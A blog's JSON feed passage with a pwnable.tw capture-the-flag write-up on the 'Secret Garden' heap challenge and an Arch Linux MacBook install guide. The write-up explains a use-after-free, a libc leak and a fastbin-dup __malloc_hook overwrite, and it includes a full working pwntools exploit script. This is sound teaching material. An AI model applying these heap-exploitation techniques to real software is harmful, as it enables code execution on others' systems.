{
    "version": "https://jsonfeed.org/version/1",
    "title": "null • All posts by \"linux\" tag",
    "description": "{software,reverse} engineer",
    "home_page_url": "https://aesophor.github.io",
    "items": [
        {
            "id": "https://aesophor.github.io/2022/08/27/pwnable-tw-secret-garden/",
            "url": "https://aesophor.github.io/2022/08/27/pwnable-tw-secret-garden/",
            "title": "[pwnable.tw] Secret Garden (350 pts)",
            "date_published": "2022-08-27T06:06:00.000Z",
            "content_html": "<p><img data-src=\"banner.png\" alt=\"banner\"></p>\n<h1 id=\"Introduction\"><a href=\"#Introduction\" class=\"headerlink\" title=\"Introduction\"></a>Introduction</h1><p>Let’s solve the heap exploitation challenge, <strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wd25hYmxlLnR3L2NoYWxsZW5nZS8jMTI=\">Secret Garden [350 pts]</span></strong> (x86_64, glibc 2.23). In summary:</p>\n<ul>\n<li>Free a large chunk into the unsorted bin.</li>\n<li>The <code>fd</code> field of the freed chunk in the unsorted bin contains a libc address whose offset within libc is a fixed value.</li>\n<li>Visit the garden and leak the libc base to stdout.</li>\n<li>Overwrite <code>__malloc_hook</code> with a one gadget using fastbin dup.</li>\n<li>Trigger our <code>__malloc_hook</code> via <code>malloc_printerr()</code>.</li>\n</ul>\n<h1 id=\"Analysis\"><a href=\"#Analysis\" class=\"headerlink\" title=\"Analysis\"></a>Analysis</h1><p>Sounds easy enough, eh? This challenge is perfect for someone who’s new to heap exploitation, as it allows us to learn how fastbin dup works, and overall it’s not too complicated. Okay, enough talk, let’s get started. Running the binary shows the following output:</p>\n<pre><code>☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆\n☆          Secret Garden          ☆\n☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆\n\n  1 . Raise a flower\n  2 . Visit the garden\n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice :\n</code></pre>\n<br>\n\n<p>Only the first three options are required for exploitation:</p>\n<ol>\n<li>Raise a flower:<ul>\n<li>malloc() twice.</li>\n<li>The first malloc(0x28) allocates a flower struct.</li>\n<li>The second malloc() allows us to specify the size.<ul>\n<li>Then it calls read() to let us edit the chunk’s user data.</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Visit the garden:<ul>\n<li>Print all the flowers’s data.</li>\n</ul>\n</li>\n<li>Remove a flower from the garden (by index):<ul>\n<li>Clear the flower struct’s first QWORD (i.e. <code>fd</code> field)</li>\n<li>free() the flower but doesn’t set it to NULL.</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"Preparation\"><a href=\"#Preparation\" class=\"headerlink\" title=\"Preparation\"></a>Preparation</h1><p>I suggest using <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NreXNpZGVyL3B3bmRvY2tlcg==\">pwndocker</span>, since it allows you to switch between different versions of glibc in a breeze, and all the commonly-used exploitation tools are already provided in the container.</p>\n<ul>\n<li>Patching ELF</li>\n</ul>\n<pre><code># patchelf --set-interpreter /glibc/2.23/64/lib/ld-2.23.so ./heap_paradise\n# ldd ./secretgarden\n        linux-vdso.so.1 (0x00007fffcb2f7000)\n        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0f13c8b000)\n        /glibc/2.23/64/lib/ld-2.23.so =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f0f1408b000)\n</code></pre>\n<ul>\n<li>To run <code>secretgarden</code> locally with glibc 2.23 (stripped):</li>\n</ul>\n<pre><code># LD_PRELOAD=./libc.so.6 ./secretgarden\n</code></pre>\n<ul>\n<li>To run <code>secretgarden</code> locally with glibc 2.23 (non-stripped):</li>\n</ul>\n<pre><code># ./secretgarden\n</code></pre>\n<blockquote>\n<p>Note:<br>The non-stripped version of glibc should only be used during exploit script development. You’ll finally need to switch over to the stripped version which comes with the challenge, because they have different offsets for symbols.</p>\n</blockquote>\n<h1 id=\"Vulnerability\"><a href=\"#Vulnerability\" class=\"headerlink\" title=\"Vulnerability\"></a>Vulnerability</h1><p>The third option, “remove a flower from the garden”, contains an obvious UAF vulnerability, as it doesn’t set the freed pointer to NULL.</p>\n<pre><code class=\"c\">_DWORD *ptrToFdField; // rax\nunsigned int index; // [rsp+4h] [rbp-14h] BYREF\n  \nif (index &lt;= 99 &amp;&amp; (ptrToFdField = (_DWORD *)flowers[index]) != 0LL) &#123;\n    *ptrToFdField = 0;\n    free(*(void **)(flowers[index] + 8LL));\n    return puts(&quot;Successful&quot;);\n&#125;\n</code></pre>\n<p>To reach the crashing state of this program, we only need to raise a flower and remove it twice.</p>\n<pre><code>Your choice : 3\nWhich flower do you want to remove from the garden:0\n*** Error in `./secretgarden&#39;: double free or corruption (fasttop): 0x0000558b995ae450 ***\nAborted (core dumped)\n</code></pre>\n<p>With this vulnerability, we can perform fastbin dup by double freeing a flower. Unfortunately, as all the protections (except FORTIFY) are enabled in this challenge, GOT hijacking is not an easy option. We’ll need to find a way to leak libc base and overwrite either <code>__malloc_hook</code> or <code>__free_hook</code> with the address of an one gadget.</p>\n<pre><code># checksec --file ./secretgarden\n[*] &#39;/ctf/work/pwnable.tw/secret-garden/secretgarden&#39;\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled\n</code></pre>\n<h1 id=\"Exploitation\"><a href=\"#Exploitation\" class=\"headerlink\" title=\"Exploitation\"></a>Exploitation</h1><p>Before we begin, let’s pay attention to the first option, “raise a flower”. Remember that it calls malloc() twice, so if we write <code>chall.create(0x420)</code> it will:</p>\n<ul>\n<li>malloc(0x28), which returns a 0x30-byte chunk (including the header)</li>\n<li>malloc(0x420), which returns a 0x430-byte chunk (including the header)</li>\n</ul>\n<h2 id=\"Leaking-libc-base\"><a href=\"#Leaking-libc-base\" class=\"headerlink\" title=\"Leaking libc base\"></a>Leaking libc base</h2><p>We can allocate and free a large chunk (0x420 bytes) into the unsorted bin, and print its <code>fd</code> field to stdout.</p>\n<pre><code>chall.create(0x420)\nchall.remove(0)\nchall.visit()\n</code></pre>\n<p><img data-src=\"bin1.png\"></p>\n<p>Wait, the freed chunk doesn’t go into the unsorted bin! That’s because the large chunk we’ve allocated is next to the top chunk, and when it is freed, it will be merged into the top chunk. To workaround this, simply allocate another small chunk with whatever size other than 0x28.</p>\n<pre><code>chall.create(0x420)\nchall.create(0x38) # new\nchall.remove(0)\nchall.visit()\n</code></pre>\n<p><img data-src=\"bin2.png\"></p>\n<p>Good. The large chunk now goes into the unsorted bin. To print it via the second option, “visit the garden”, we need to allocate it again and make sure we don’t overwrite the <code>fd</code> field.</p>\n<pre><code>chall.create(0x420)\nchall.create(0x38)\nchall.remove(0)\nchall.create(0x420, b&#39;&#39;) # new\nchall.visit()\n</code></pre>\n<p><img data-src=\"bin3.png\"></p>\n<p>Unfortunately, if we choose option 1, it won’t return us the exact same 0x430-byte chunk from before. As we can see, option 1 calls <code>malloc()</code> twice, 0x28 and 0x420 respectively. So when the program calls <code>malloc(0x28)</code>, glibc splits our 0x430-byte free chunk in the unsorted bin into two halves: (1) a 0x30-byte chunk, and (2) a 0x400-byte chunk. This former is returned to the user, while the latter is put into a large bin.</p>\n<p>To workaround this, we need to place a 0x30-byte chunk in a fastbin, so that glibc can return that chunk instead of splitting from our 0x430-byte chunk. As shown below, the <code>fd</code> field of the 0x430-byte chunk is successfully leaked to stdout.</p>\n<pre><code>chall.create(0x420)\nchall.create(0x38)\nchall.create(0x28) # new\nchall.remove(2)    # new\nchall.remove(0)\nchall.create(0x420, b&#39;&#39;)\nchall.visit()\n</code></pre>\n<pre><code>[*] leaked: 0x7fdad280db0a\n[*] leaked libc_base: 0x7fdad244a000\n</code></pre>\n<p><img data-src=\"leaked.png\"></p>\n<h2 id=\"Overwriting-malloc-hook-libc-via-fastbin-dup\"><a href=\"#Overwriting-malloc-hook-libc-via-fastbin-dup\" class=\"headerlink\" title=\"Overwriting __malloc_hook@libc via fastbin dup\"></a>Overwriting __malloc_hook@libc via fastbin dup</h2><p>Next, we can use the <strong>fastbin dup</strong> technique to achieve arbitrary write. We need to either:</p>\n<ul>\n<li>overwrite <code>__malloc_hook@libc</code> and trigger <code>malloc()</code>, or</li>\n<li>overwrite <code>__free_hook@libc</code> and trigger <code>free()</code></li>\n</ul>\n<p>Let’s try to bypass the infamous “double free or corruption (fasttop)” error with the ABA pattern [<a href=\"#check-1-double-free-or-corruption-fasttop\">1</a>].</p>\n<pre><code>chall.create(0x68)\nchall.create(0x68)\nchall.remove(4)\nchall.remove(5)\nchall.remove(4)\n</code></pre>\n<p><img data-src=\"bin4.png\"></p>\n<p>Good. We now have two overlapping (same) chunks in the same fastbin. Now we can overwrite the <code>fd</code> field of this chunk.</p>\n<pre><code>chall.create(0x68)\nchall.create(0x68)\nchall.remove(4)\nchall.remove(5)\nchall.remove(4)\nchall.create(0x68, p64(libc_base + libc.sym[&#39;__free_hook&#39;]))\nchall.create(0x68)\nchall.create(0x68)\nchall.create(0x68, p64(libc_base + one_gadget))\n</code></pre>\n<p><img data-src=\"bin5.png\"></p>\n<p>Okay, here’s another restriction we need to bypass. In glibc, <code>malloc()</code> will refuse to return a freed chunk from a fastbin if that chunk’s <code>size</code> field is incorrect [<a href=\"#check-2-malloc-memory-corruption-fast\">2</a>].</p>\n<pre><code>Error in `/ctf/work/pwnable.tw/secret-garden/secretgarden&#39;: malloc(): memory corruption (fast): 0x00007efdb9063b20 ***\n</code></pre>\n<p>To bypass this, we need to rethink where we’re trying to write data into. The answer is <code>__malloc_hook</code> or <code>__free_hook</code>, right? Let’s take a look at that memory region.</p>\n<p><img data-src=\"hooks.png\"></p>\n<p><img data-src=\"7f.png\"></p>\n<p>All the bytes near <code>__free_hook</code> are all NULL bytes, so it’s not easy to be overwritten with fastbin dup. However, there’s a sequence of bytes “7f 00 00 00 00 00 00 00” before <code>__malloc_hook</code>. If we use these bytes as the free chunk’s <code>size</code> field, then we’ll get a 0x70-byte free chunk, and this is enough for us to overwrite <code>__malloc_hook</code>.</p>\n<pre><code>chall.create(0x68)\nchall.create(0x68)\nchall.remove(4)\nchall.remove(5)\nchall.remove(4)\nchall.create(0x68, p64(libc_base + libc.sym[&#39;__malloc_hook&#39;] - 35))\nchall.create(0x68)\nchall.create(0x68)\nchall.create(0x68, 19 * b&#39;A&#39; + p64(libc_base + one_gadget))\nchall.create(0x68) # trigger __malloc_hook\n</code></pre>\n<h2 id=\"Triggering-our-malloc-hook\"><a href=\"#Triggering-our-malloc-hook\" class=\"headerlink\" title=\"Triggering our __malloc_hook\"></a>Triggering our __malloc_hook</h2><p>The last thing that will probably annoy you is that the constraints of all four one gadgets are unsatisfiable when <code>__malloc_hook</code> is triggered via option 1, “raise a flower”.</p>\n<p><img data-src=\"one_gadget.png\"></p>\n<p>Fortunately, there’s another way to trigger <code>__malloc_hook</code>: via <code>malloc_printerr()</code>. This function is used to print error message when <code>malloc()</code> and <code>free()</code> fails, and most importantly, it calls <code>malloc()</code>. Now back to our question, the easiest way to invoke <code>malloc_printerr()</code> is to create a “double free or corruption (fasttop)” error [<a href=\"#check-1-double-free-or-corruption-fasttop\">1</a>] on purpose.</p>\n<pre><code>chall.create(0x68)\nchall.create(0x68)\nchall.remove(4)\nchall.remove(5)\nchall.remove(4)\nchall.create(0x68, p64(libc_base + libc.sym[&#39;__malloc_hook&#39;] - 35))\nchall.create(0x68)\nchall.create(0x68)\n\n# Prepare a chunk for (fasttop) error\nchall.create(0x48)\n\n# Overwrite __malloc_hook.\nchall.create(0x68, 19 * b&#39;A&#39; + p64(libc_base + one_gadget))\n\n# Trigger &quot;double free or corruption (fasttop)&quot;.\nchall.remove(9)\nchall.remove(9)\n</code></pre>\n<h1 id=\"Full-Exploit-Script\"><a href=\"#Full-Exploit-Script\" class=\"headerlink\" title=\"Full Exploit Script\"></a>Full Exploit Script</h1><pre><code class=\"python\">#!/usr/bin/env python3\n# -*- encoding: utf-8 -*-\n\nfrom pwn import *\ncontext.update(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;)\n\nelf  = ELF(&#39;./secretgarden&#39;, checksec = False)\nlibc = ELF(&#39;./libc_64.so.6&#39;, checksec = False)\none_gadget = 0xef6c4\nA8 = 7 * b&#39;A&#39;\n\nclass Challenge:\n    def __init__(self, proc):\n        self.proc = proc\n\n    def create(self, len_name, name = A8, color = A8):\n        &quot;&quot;&quot; malloc(0x28), malloc(len_name) &quot;&quot;&quot;\n        self.proc.sendlineafter(b&#39;choice : &#39;, b&#39;1&#39;)\n        self.proc.sendlineafter(b&#39;name :&#39;, str(len_name).encode(&#39;utf-8&#39;))\n        self.proc.sendlineafter(b&#39;of flower :&#39;, name)\n        self.proc.sendlineafter(b&#39;the flower :&#39;, color)\n\n    def visit(self):\n        self.proc.sendlineafter(b&#39;choice : &#39;, b&#39;2&#39;)\n\n    def remove(self, index):\n        self.proc.sendlineafter(b&#39;choice : &#39;, b&#39;3&#39;)\n        self.proc.sendlineafter(b&#39;garden:&#39;, str(index).encode(&#39;utf-8&#39;))\n\n    def cleanup(self):\n        self.proc.sendlineafter(b&#39;choice : &#39;, b&#39;4&#39;)\n\ndef main():\n    proc = remote(&#39;chall.pwnable.tw&#39;, 10203)\n\n    chall = Challenge(proc)\n\n    # Prepare a large chunk.\n    chall.create(0x420)\n\n    # Prevents the large chunk from being merged into the top chunk.\n    chall.create(0x38)\n\n    # Prevents the 0x430-byte chunk from being split.\n    chall.create(0x28)\n    chall.remove(2)\n\n    # Free the 0x430-byte chunk into unsorted bin.\n    chall.remove(0)\n\n    # Allocate the 0x430-byte chunk again so that visit() can print it.\n    chall.create(0x420, b&#39;&#39;, b&#39;A&#39;)\n\n    chall.visit()\n\n    proc.recvuntil(b&#39;flower[3] :&#39;)\n    leaked = u64(proc.recv(6).ljust(8, b&#39;\\x00&#39;))\n    offset = 0x7fb7dafc4b0a - 0x7fb7dac01000\n    libc_base = leaked - offset\n    log.info(&#39;leaked libc_base: &#123;&#125;&#39;.format(hex(libc_base)))\n\n    # Overwrite __malloc_hook with one gadget using fastbin dup.\n    chall.create(0x68)\n    chall.create(0x68)\n    chall.remove(4)\n    chall.remove(5)\n    chall.remove(4)\n    chall.create(0x68, p64(libc_base + libc.sym[&#39;__malloc_hook&#39;] - 35))\n    chall.create(0x68)\n    chall.create(0x68)\n\n    # Trigger __malloc_hook.\n    # It seems that raising a flower will cause the one gadgets to crash.\n    # An alternative way is to trigger __malloc_hook via malloc_printerr().\n    # To do this, we can trigger a &quot;double free or corruption (fasttop)&quot;.\n    chall.create(0x48)  # prepare a chunk for (fasttop) error\n    chall.create(0x68, 19 * b&#39;A&#39; + p64(libc_base + one_gadget))  # overwrite __malloc_hook\n    chall.remove(9)\n    chall.remove(9)\n\n    proc.interactive()\n\nif __name__ == &#39;__main__&#39;:\n    main()\n</code></pre>\n<h1 id=\"Fastbin-Related-Error-Handling\"><a href=\"#Fastbin-Related-Error-Handling\" class=\"headerlink\" title=\"Fastbin-Related Error Handling\"></a>Fastbin-Related Error Handling</h1><h2 id=\"Check-1-double-free-or-corruption-fasttop\"><a href=\"#Check-1-double-free-or-corruption-fasttop\" class=\"headerlink\" title=\"Check 1: double free or corruption (fasttop)\"></a>Check 1: double free or corruption (fasttop)</h2><p>In glibc 2.23, <code>_int_free()</code> will refuse to free the given pointer <code>p</code> when the first chunk in fastbin is <code>p</code>.</p>\n<pre><code class=\"c\">/* Check that the top of the bin is not the record we are going to add\n   (i.e., double free).  */\nif (__builtin_expect(old == p, 0)) &#123;\n    errstr = &quot;double free or corruption (fasttop)&quot;;\n    goto errout;\n&#125;\n</code></pre>\n<p>Source: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vZ2xpYmMvZ2xpYmMtMi4yMy9zb3VyY2UvbWFsbG9jL21hbGxvYy5jI0wzOTM3\">https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3937</span></p>\n<p>To bypass this restriction, a commonly used technique is:</p>\n<ul>\n<li>free(A)</li>\n<li>free(B)</li>\n<li>free(A)</li>\n</ul>\n<h2 id=\"Check-2-malloc-memory-corruption-fast\"><a href=\"#Check-2-malloc-memory-corruption-fast\" class=\"headerlink\" title=\"Check 2: malloc(): memory corruption (fast)\"></a>Check 2: malloc(): memory corruption (fast)</h2><p>In glibc 2.23, <code>_int_malloc()</code> will refuse to return a freed chunk from a fastbin if that chunk has incorrect size.</p>\n<pre><code class=\"c\">if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) &#123;\n    errstr = &quot;malloc(): memory corruption (fast)&quot;;\nerrout:\n    malloc_printerr(check_action, errstr, chunk2mem (victim), av);\n    return NULL;\n&#125;\n</code></pre>\n<p>Source: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vZ2xpYmMvZ2xpYmMtMi4yMy9zb3VyY2UvbWFsbG9jL21hbGxvYy5jI0wzMzg1\">https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3385</span></p>\n<p>To bypass this restriction, the freed chunk’s <code>size</code> field (right before <code>fd</code>) must be set to the correct size. A commonly used technique is to:</p>\n<ul>\n<li>Look for the byte pattern <code>7f 00 00 00 00 00 00 00</code> in memory, and use it as the <code>size</code> field.</li>\n<li>Go back 8 bytes to obtain the base address of the chunk.</li>\n<li>Place this chunk into a fastbin, either by free()ing it or fastbin dup.</li>\n</ul>\n",
            "tags": [
                "linux",
                "ctf",
                "binary-exploitation"
            ]
        },
        {
            "id": "https://aesophor.github.io/2020/07/20/Arch-Linux-on-MacBook-Pro-11-2-with-Custom-NVMe-M-2-SSD/",
            "url": "https://aesophor.github.io/2020/07/20/Arch-Linux-on-MacBook-Pro-11-2-with-Custom-NVMe-M-2-SSD/",
            "title": "Arch Linux on MacBook Pro 11,2 with Custom NVMe M.2 SSD",
            "date_published": "2020-07-20T10:48:46.000Z",
            "content_html": "<p><img data-src=\"banner.jpg\" alt=\"banner\"></p>\n<h1 id=\"Introduction\"><a href=\"#Introduction\" class=\"headerlink\" title=\"Introduction\"></a>Introduction</h1><p>The only laptop I own is Apple’s <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdXBwb3J0LmFwcGxlLmNvbS9rYi9zcDcwND9sb2NhbGU9ZW5fVVM=\">MacBook Pro Retina 15” (late 2014)</span>, on which I’ve run Gentoo Linux for about three years. Recently, I replaced my MacBook’s SSD with <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2Ftc3VuZy5jb20vc2VtaWNvbmR1Y3Rvci9taW5pc2l0ZS9zc2QvcHJvZHVjdC9jb25zdW1lci85NzBldm9wbHVzLw==\">Samsung’s 970 EVO Plus NVMe M.2 SSD (1TB)</span> and decided to install Arch Linux on it.</p>\n<h1 id=\"Back-Up-the-Old-SSD\"><a href=\"#Back-Up-the-Old-SSD\" class=\"headerlink\" title=\"Back Up the Old SSD\"></a>Back Up the Old SSD</h1><p>I booted into a <code>Gentoo Live USB</code> and used <code>dd</code> to back up my entire old SSD to an image file.</p>\n<pre><code>root$ dd if=/dev/sda of=/mnt/external_drive/old_ssd.img bs=4M\n</code></pre>\n<p>Later on, after the new NVMe M.2 SSD has been installed, I could mount my external hard drive on <code>/mnt/external_drive</code> and run the following commands to copy all my data from the image file to the new SSD. The only drawback of this approach is that I have to manually resize the partitions later.</p>\n<pre><code>root$ dd if=/mnt/external_drive/old_ssd.img of=/dev/nvme0n1 bs=4M\n</code></pre>\n<h1 id=\"Firmware-Upgrade\"><a href=\"#Firmware-Upgrade\" class=\"headerlink\" title=\"Firmware Upgrade\"></a>Firmware Upgrade</h1><p>Before installing NVMe M.2 SSD on your MacBook, make sure that you’ve upgraded to <strong>macOS Mojave which includes the firmware required to boot from NVMe M.2 SSD</strong>.</p>\n<h1 id=\"SSD-Upgrade\"><a href=\"#SSD-Upgrade\" class=\"headerlink\" title=\"SSD Upgrade\"></a>SSD Upgrade</h1><blockquote>\n<p><strong>CAUTION</strong><br><br>Be very careful with the screws. I stripped some of my screws due to the bloated batteries, and ended up spending $3000 NTD (approx. $100 USD) for repairment.</p>\n</blockquote>\n<p>After upgrading to macOS Mojave, your MacBook should be able to recognize NVMe M.2 SSD from now on. Now we can remove the screws on its back and install the new SSD. I bought the Screwdrivers + SSD Adapter on shopee.tw -&gt; <a href=\"https://shopee.tw/product/4848951/1501356237\"><strong>Link</strong></a></p>\n<p><img data-src=\"swap.jpg\" alt=\"swap\"></p>\n<h1 id=\"SSD-Data-Migration\"><a href=\"#SSD-Data-Migration\" class=\"headerlink\" title=\"SSD Data Migration\"></a>SSD Data Migration</h1><p>After upgrading my MacBook’s SSD, I installed macOS on it and used it for a week. However, being a long-term GNU/Linux user, I started to miss all that freedom and customizability offered by Linux. Therefore, I decided to go back to Linux again.</p>\n<p>At first I used <code>dd</code> to clone all my data from the image file to the new SSD. However, this didn’t work for me, since <strong>I didn’t compile support for NVMe M.2 SSD into my gentoo linux kernel</strong>, so although the disk was successfully migrated, I wasn’t able to boot from it.</p>\n<h1 id=\"Prepare-Installation-Medium\"><a href=\"#Prepare-Installation-Medium\" class=\"headerlink\" title=\"Prepare Installation Medium\"></a>Prepare Installation Medium</h1><p>Instead of trying to recompile a new linux kernel with NVMe M.2 SSD support, I decided to leave Gentoo Linux this time. Gentoo is a beautiful Linux distribution (if you have time and patience), but after manually compiling all those packages for 3 years on this fucking MacBook, I’ve already become kinda fed up with it.</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYXJjaGxpbnV4Lm9yZy9kb3dubG9hZC8=\">Download Arch Linux ISO</span> and prepare Arch Live USB:</p>\n<pre><code>root$ dd if=/path/to/arch.iso of=/dev/sdX bs=4M\n</code></pre>\n<p>Power off your MacBook, insert the USB stick, hold <code>alt/option</code> and power it on again. Now you should see the option to boot from Arch Linux Live USB.</p>\n<h1 id=\"Base-Installation\"><a href=\"#Base-Installation\" class=\"headerlink\" title=\"Base Installation\"></a>Base Installation</h1><p>After booting from Arch Linux Live USB, you’ll be logged in as the root user. To get Internet connection, I simply plugged my Android phone into my Macbook simply via USB cable, turned on <code>USB Tethering</code>, and ran:</p>\n<pre><code>root$ dhcpcd\n</code></pre>\n<p>Ensure the clock is accurate:</p>\n<pre><code>root$ timedatectl set-ntp true\n</code></pre>\n<p>Run <code>cfdisk /dev/nvme0n1</code> and partition the new SSD as follows:</p>\n<pre><code>                                   Disk: /dev/nvme0n1\n                 Size: 931.53 GiB, 1000204886016 bytes, 1953525168 sectors\n                Label: gpt, identifier: 85CF6A21-FC5C-408D-8532-8751C80F0593\n\nDevice                 Start          End        Sectors        Size Type\n/dev/nvme0n1p1          2048       411647         409600        200M EFI System             \n/dev/nvme0n1p2       411648    1953525134     1953113487      931.3G Linux filesystem\n</code></pre>\n<p>Now run <code>lsblk</code> and you’ll see something like this:</p>\n<pre><code>NAME               MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINT\nnvme0n1            259:0    0 931.5G  0 disk  \n├─nvme0n1p1        259:1    0   200M  0 part  \n└─nvme0n1p2        259:2    0 931.3G  0 part  \n</code></pre>\n<p>Prepare LVM+LUKS on the new SSD:</p>\n<pre><code>root$ cryptsetup -v --cipher aes-xts-plain64 --key-size 256 --hash sha1 --iter-time 1000\\\n            --use-random --verify-passphrase luksFormat /dev/nvme0n1p2\nroot$ cryptsetup luksOpen /dev/nvme0n1p2 lvm\nroot$ pvcreate /dev/mapper/lvm\nroot$ vgcreate vgcrypt /dev/mapper/lvm\nroot$ lvcreate --size 30G --name root vgcrypt\nroot$ lvcreate --extents +100%FREE --name home vgcrypt\nroot$ mkfs.fat -F32 /dev/nvme0n1p1\nroot$ mkfs.ext4 /dev/mapper/vgcrypt-root\nroot$ mkfs.ext4 /dev/mapper/vgcrypt-home\n</code></pre>\n<p>Now run <code>lsblk</code> again and you’ll see something like this:</p>\n<pre><code>NAME               MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINT\nnvme0n1            259:0    0 931.5G  0 disk  \n├─nvme0n1p1        259:1    0   200M  0 part  \n└─nvme0n1p2        259:2    0 931.3G  0 part  \n  └─vgcrypt        254:0    0 931.3G  0 crypt \n    ├─vgcrypt-root 254:1    0    30G  0 lvm   \n    └─vgcrypt-home 254:2    0 901.3G  0 lvm   \n</code></pre>\n<p>Mount the partitions:</p>\n<pre><code>root$ mount /dev/mapper/vgcrypt-root /mnt\nroot$ mkdir -p /mnt/home\nroot$ mkdir -p /mnt/boot\nroot$ mount /dev/mapper/vgcrypt-home /mnt/home\nroot$ mount /dev/nvme0n1p1 /mnt/boot\n</code></pre>\n<p>Install the base system:</p>\n<pre><code>root$ pacstrap -i /mnt base base-devel linux linux-firmware lvm2\n</code></pre>\n<p>Generate fstab:</p>\n<ul>\n<li><code>-L</code> generates the fstab with labels instead of UUIDs since we’re using encrypted LVM disk.</li>\n<li><code>-p</code> prevents pseudo-filesystems from being added.</li>\n</ul>\n<pre><code>root$ genfstab -L -p /mnt &gt;&gt; /mnt/etc/fstab\nroot$ cat /mnt/etc/fstab\n</code></pre>\n<h1 id=\"Configure-the-New-System\"><a href=\"#Configure-the-New-System\" class=\"headerlink\" title=\"Configure the New System\"></a>Configure the New System</h1><p>Chroot into our new system:</p>\n<pre><code>root$ arch-chroot /mnt /bin/bash\n</code></pre>\n<p>Generate locales:</p>\n<ul>\n<li>uncomment the locales you’re going to use in /etc/locale.gen, and run <code>locale-gen</code>.</li>\n<li>run <code>echo LANG=en_US.UTF-8 &gt; /etc/locale.conf</code> to make ENG UTF-8 the default locale. </li>\n</ul>\n<p>Replace the default console font with terminus:</p>\n<pre><code>root$ pacman -S terminus-font\nroot$ echo FONT=ter-v24n &gt; /etc/vconsole.conf\n</code></pre>\n<p>Set timezone and set time to UTC:</p>\n<pre><code>root$ ln -sf /usr/share/zoneinfo/Asia/Taipei /etc/localtime\nroot$ hwclock --systohc --utc\n</code></pre>\n<p>To ensure the kernel loads the proper modules to decrypt root disk at startup, we have to add necessary hooks in <code>/etc/mkinitcpio.conf</code>:</p>\n<pre><code>HOOKS=&quot;base udev autodetect keyboard keymap modconf block consolefont encrypt lvm2 filesystems fsck&quot;\n</code></pre>\n<p>Regenerate the initramfs image to EFI Partition (<code>/dev/nvme0n1p1</code>):</p>\n<pre><code>root$ mkinitcpio -p linux\n</code></pre>\n<p>Set hostname:</p>\n<pre><code>root$ echo allegro &gt; /etc/hostname\n</code></pre>\n<p>Install systemd-boot as our bootloader:</p>\n<pre><code>root$ pacman -S dosfstools\nroot$ bootctl --path=/boot install\n</code></pre>\n<p>Add an boot entry for systemd-boot by editing <code>/boot/loader/entries/arch.conf</code>:</p>\n<pre><code>title    Arch Linux\nlinux    /vmlinuz-linux\ninitrd    /initramfs-linux.img\noptions    cryptdevice=/dev/nvme0n1p2:vgcrypt root=/dev/mapper/vgcrypt-root rw\n</code></pre>\n<p>Change root user’s password:</p>\n<pre><code>root$ passwd\n</code></pre>\n<p>Install additional packages:</p>\n<pre><code>root$ pacman -S dhcpcd git zsh vim neovim wget stow tmux\n</code></pre>\n<p>Reboot:</p>\n<pre><code>root$ reboot\n</code></pre>\n<p>Add an unprivileged user:</p>\n<pre><code>root$ useradd --create-home --groups wheel --shell /bin/zsh aesophor\nroot$ passwd aesophor\n</code></pre>\n<p>Set up sudo:</p>\n<ul>\n<li>run <code>visudo</code> and uncomment the line <code>%wheel ALL=(ALL) ALL</code>.</li>\n</ul>\n<p>At this point, you may logout the root user and re-login with your unprivileged user.</p>\n<h1 id=\"Post-Installation\"><a href=\"#Post-Installation\" class=\"headerlink\" title=\"Post Installation\"></a>Post Installation</h1><p>Install <a href=\"https://github.com/Jguer/yay\"><code>yay</code></a>, an AUR helper:</p>\n<pre><code>user$ git clone https://aur.archlinux.org/yay.git\nuser$ cd yay\nuser$ sudo makepkg -si\n</code></pre>\n<p>Install X and video drivers:</p>\n<pre><code>user$ sudo pacman -S xf86-video-intel mesa-libgl libva-intel-driver libva\nuser$ yay -S opencl-intel\nuser$ sudo pacman -S xorg-server xorg-xinit xorg-apps\n</code></pre>\n<p>Install <code>xf86-input-mtrack</code> as our trackpad driver:</p>\n<pre><code>user$ yay -S xf86-input-mtrack\nuser$ sudo wget -O /etc/X11/xorg.conf.d/10-mtrack.conf https://raw.githubusercontent.com/aesophor/macbookpro-11-2-gentoo-config/master/etc/X11/xorg.conf.d/10mtrack.conf\nuser$ sudo gpasswd -a aesophor input\n</code></pre>\n<p>Install <code>broadcom-wl-dkms</code> as our Wi-Fi driver (my laptop model is A1398):</p>\n<pre><code>user$ sudo pacman -S dkms broadcom-wl-dkms\n</code></pre>\n<p>Install <code>bcwc-pcie-git</code> as our FaceTimeHD webcam driver:</p>\n<pre><code>user$ yay -S bcwc-pcie-git\n</code></pre>\n<p>Install font packages:</p>\n<pre><code>user$ sudo pacman -S ttf-liberation wqy-zenhei wqy-bitmapfont\nuser$ yay -S siji-git uw-ttyp0-font\n</code></pre>\n<p>Get audio to work:</p>\n<pre><code>user$ sudo pacman -S pulseaudio alsa-lib alsa-utils\n</code></pre>\n<p>Install DE, WM, bar, etc:</p>\n<pre><code>user$ sudo pacman -S plasma-desktop\nuser$ yay -S wmderland-git polybar dunst picom rofi-git rxvt-unicode firefox\n</code></pre>\n<p>Install fcitx5 input method:</p>\n<pre><code>user$ sudo pacman -S fcitx5 fcitx5-chinese-addons fcitx5-configtool fcitx5-gtk fcitx5-qt 